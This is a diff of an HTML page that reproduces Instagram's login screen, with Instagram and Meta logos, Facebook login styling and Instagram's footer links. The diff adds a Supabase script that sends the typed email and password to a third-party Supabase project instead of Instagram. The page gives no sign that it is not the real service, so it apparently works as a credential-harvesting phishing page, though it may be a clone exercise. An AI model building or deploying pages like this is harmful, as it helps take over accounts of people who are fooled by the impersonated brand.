@@ -65,31 +65,35 @@
   </style>
 </head>
 <body>
+  <!-- Splash -->
   <div class="splash" id="splash">
     <img src="https://static.vecteezy.com/system/resources/previews/018/930/691/non_2x/instagram-logo-instagram-icon-transparent-free-png.png" alt="Instagram Logo" class="insta-logo">
-  
-  <div class="meta">
-    <p>Meta</p>
-    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTB4w6i4wMu5SU48UYbGexp-4hIBzDPAXoLFA&s" alt="Meta logo"></div>
+    <div class="meta">
+      <p>Meta</p>
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTB4w6i4wMu5SU48UYbGexp-4hIBzDPAXoLFA&s" alt="Meta logo">
+    </div>
   </div>
 
+  <!-- Login Page -->
   <div class="page">
-    <div class="card" role="region" aria-label="Instagram login box">
+    <div class="card">
       <p class="logo">Instagram</p>
-      <form onsubmit="event.preventDefault()">
-        <input class="input" placeholder="Phone number, username, or email" aria-label="username or email" />
-        <input class="input" placeholder="Password" type="password" aria-label="password" />
-        <button class="btn">Log in</button>
+      <form id="loginForm">
+        <input id="email" class="input" placeholder="Email" type="email" required />
+        <input id="password" class="input" placeholder="Password" type="password" required />
+        <button class="btn" type="submit">Log in</button>
         <div class="or-row"><hr /><span>OR</span><hr /></div>
-        <div class="fb" role="button" tabindex="0" aria-label="Log in with Facebook">
+        <div class="fb">
           <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M22 12.073C22 6.48 17.523 2 12 2S2 6.48 2 12.073C2 17.088 5.657 21.128 10.438 21.951v-6.78H7.898v-3.1h2.54V9.413c0-2.507 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.242 0-1.63.771-1.63 1.562v1.875h2.773l-.443 3.1h-2.33v6.78C18.343 21.128 22 17.088 22 12.073z" fill="currentColor"/></svg>
           <span>Log in with Facebook</span>
         </div>
         <div class="forgot">Forgot password?</div>
       </form>
     </div>
+
     <div class="signup-card">Don't have an account? <a href="#">Sign up</a></div>
-    <div class="footer" aria-hidden="true">
+
+    <div class="footer">
       <div class="links">
         <a href="#">Meta</a>
         <a href="#">About</a>
@@ -102,7 +106,6 @@
         <a href="#">Locations</a>
         <a href="#">Instagram Lite</a>
         <a href="#">Meta AI</a>
-        <a href="#">Meta AI Articles</a>
         <a href="#">Threads</a>
         <a href="#">Contact Uploading & Non-Users</a>
         <a href="#">Meta Verified</a>
@@ -110,7 +113,33 @@
     </div>
   </div>
 
-  <script>
+  <!-- Supabase Integration -->
+  <script type="module">
+    import { createClient } from "https://esm.sh/@supabase/supabase-js";
+
+    // Replace these with your Supabase credentials
+    const SUPABASE_URL = "https://pkewlhgsejappgfkirct.supabase.co";
+    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBrZXdsaGdzZWphcHBnZmtpcmN0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjIzNjM1NDEsImV4cCI6MjA3NzkzOTU0MX0.Eu20VblWf-spd4NgdpPMwfrB7SYoS8tuMwqm9CdQeNY";
+
+    const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
+
+    const form = document.getElementById('loginForm');
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      const { data, error } = await supabase.auth.signInWithPassword({ email, password });
+
+      if (error) {
+        alert("Login failed: " + error.message);
+      } else {
+        alert("Login successful! Welcome, " + data.user.email);
+        console.log(data);
+      }
+    });
+
+    // Splash transition
     window.addEventListener('load',()=>{
       const splash=document.getElementById('splash');
       setTimeout(()=>splash.classList.add('hide'),2000);
